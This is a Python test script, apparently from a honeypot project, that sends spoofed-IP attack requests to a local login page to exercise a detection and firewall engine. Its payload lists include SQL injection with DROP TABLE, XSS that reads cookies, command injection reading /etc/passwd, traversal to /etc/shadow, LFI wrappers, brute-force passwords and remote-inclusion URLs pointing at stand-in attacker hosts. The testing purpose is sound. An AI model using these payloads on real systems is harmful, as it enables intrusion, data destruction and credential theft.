"""
Fake Attacker — sends attack requests to the honeypot from spoofed IPs.
Educational tool for testing the detection and firewall engine.

Usage:
    python fake_attacker.py
    python fake_attacker.py --ip 203.0.113.45 --attack sqli
    python fake_attacker.py --ip 45.33.32.156 --attack all

Requires: pip install requests
"""
import argparse
import time
import random
import requests
from requests.exceptions import ConnectionError, Timeout

BASE_URL = "http://127.0.0.1:8000"
LOGIN_URL = f"{BASE_URL}/login/"

# Spoofed source IPs (all from TEST-NET / documentation ranges — safe)
FAKE_IPS = [
    "203.0.113.45",   # TEST-NET-3 (RFC 5737)
    "198.51.100.22",  # TEST-NET-2
    "192.0.2.100",    # TEST-NET-1
    "45.33.32.156",   # doc range
    "198.51.100.77",
    "203.0.113.200",
    "192.0.2.50",
    "198.51.100.9",
]

FAKE_USER_AGENTS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Mozilla/5.0 (compatible; Nikto/2.1.6)",
    "python-requests/2.28.0",
    "nmap Scripting Engine",
    "Hydra/9.4",
    "Metasploit Framework",
    "curl/7.88.1",
    "Go-http-client/1.1",
]

ATTACKS = {
    "sqli": [
        {"username": "admin' OR '1'='1' --", "password": "x"},
        {"username": "' OR 1=1 --",          "password": "x"},
        {"username": "admin' UNION SELECT 1,2,3 --", "password": "x"},
        {"username": "admin'; DROP TABLE users; --", "password": "x"},
        {"username": "' OR SLEEP(5) --",     "password": "x"},
    ],
    "xss": [
        {"username": "<img src=x onerror=alert(1)>", "password": "x"},
        {"username": "<svg onload=alert('XSS')>",    "password": "x"},
        {"username": "<body onload=alert('XSS')>",   "password": "x"},
        {"username": "<input onfocus=alert(1) autofocus>", "password": "x"},
        {"username": "javascript:alert(document.cookie)", "password": "x"},
    ],
    "brute": [
        {"username": "admin",         "password": "123456"},
        {"username": "admin",         "password": "password"},
        {"username": "root",          "password": "toor"},
        {"username": "administrator", "password": "admin"},
        {"username": "admin",         "password": "letmein"},
        {"username": "admin",         "password": "qwerty"},
        {"username": "admin",         "password": "welcome"},
        {"username": "admin",         "password": "password123"},
    ],
    "cmd": [
        {"username": "admin; whoami",              "password": "x"},
        {"username": "admin | cat /etc/passwd",    "password": "x"},
        {"username": "admin && uname -a",          "password": "x"},
        {"username": "admin`id`",                  "password": "x"},
        {"username": "admin; netstat -an",         "password": "x"},
    ],
    "traversal": [
        {"username": "../../../../etc/passwd",     "password": "x"},
        {"username": "../../../../etc/shadow",     "password": "x"},
        {"username": "/proc/self/environ",         "password": "x"},
        {"username": "%2e%2e/%2e%2e/etc/passwd",   "password": "x"},
        {"username": "C:\\Windows\\win.ini",       "password": "x"},
    ],
    "lfi": [
        {"username": "php://filter/convert.base64-encode/resource=index", "password": "x"},
        {"username": "file:///etc/passwd",         "password": "x"},
        {"username": "expect://id",                "password": "x"},
        {"username": "/var/log/auth.log",          "password": "x"},
        {"username": "phar://archive.phar/p.txt",  "password": "x"},
    ],
    "rfi": [
        {"username": "http://evil.example.com/shell.php",  "password": "x"},
        {"username": "https://attacker.com/payload.txt",   "password": "x"},
        {"username": "ftp://evil.com/backdoor.php",        "password": "x"},
        {"username": "http://192.168.1.100/cmd.php",       "password": "x"},
        {"username": "http://203.0.113.1/r.pl",            "password": "x"},
    ],
    "recon": [
        {"username": "sqlmap",  "password": "test"},
        {"username": "nikto",   "password": "test"},
        {"username": "nmap",    "password": "test"},
        {"username": "hydra",   "password": "test"},
        {"username": "gobuster","password": "test"},
    ],
}


def send_attack(ip, attack_type, payload, session, verbose=True):
    headers = {
        "X-Forwarded-For": ip,
        "User-Agent": random.choice(FAKE_USER_AGENTS),
        "X-Real-IP": ip,
    }
    try:
        r = session.post(LOGIN_URL, data=payload, headers=headers, timeout=5, allow_redirects=False)
        status = r.status_code
        if verbose:
            u = payload['username'][:45]
            p = payload['password'][:20]
            print(f"  [{ip}] {attack_type:12s} | user={u!r:48} | HTTP {status}")
        return status
    except (ConnectionError, Timeout) as e:
        if verbose:
            print(f"  [{ip}] CONNECTION ERROR: {e}")
        return None


def run_attack(ip, attack_type, delay=0.3, verbose=True):
    payloads = ATTACKS.get(attack_type, [])
    if not payloads:
        print(f"Unknown attack type: {attack_type}")
        return
    print(f"\n>> Starting {attack_type.upper()} from {ip} ({len(payloads)} payloads)")
    with requests.Session() as s:
        for pl in payloads:
            send_attack(ip, attack_type, pl, s, verbose)
            time.sleep(delay)
    print(f"   Done.")


def main():
    parser = argparse.ArgumentParser(description="CyberSentinel Fake Attacker (educational)")
    parser.add_argument("--ip", default=None, help="Spoofed source IP (default: random from pool)")
    parser.add_argument("--attack", default="sqli",
                        help="Attack type: sqli|xss|brute|cmd|traversal|lfi|rfi|recon|all (default: sqli)")
    parser.add_argument("--delay", type=float, default=0.3, help="Seconds between requests (default: 0.3)")
    args = parser.parse_args()

    # Enable X-Forwarded-For trust reminder
    print("=" * 60)
    print("  CyberSentinel Fake Attacker — Educational Testing Tool")
    print("=" * 60)
    print(f"  Target : {LOGIN_URL}")
    print(f"  Attack : {args.attack}")
    print()
    print("  NOTE: Set USE_X_FORWARDED_FOR=1 in environment so Django")
    print("  trusts the X-Forwarded-For header and logs the fake IP.")
    print("  Example:  set USE_X_FORWARDED_FOR=1 && python manage.py runserver")
    print("=" * 60)

    ip = args.ip or random.choice(FAKE_IPS)

    if args.attack == "all":
        for atype in ATTACKS:
            run_attack(ip, atype, args.delay)
            ip = random.choice(FAKE_IPS)  # rotate IP per attack
    else:
        run_attack(ip, args.attack, args.delay)


if __name__ == "__main__":
    main()
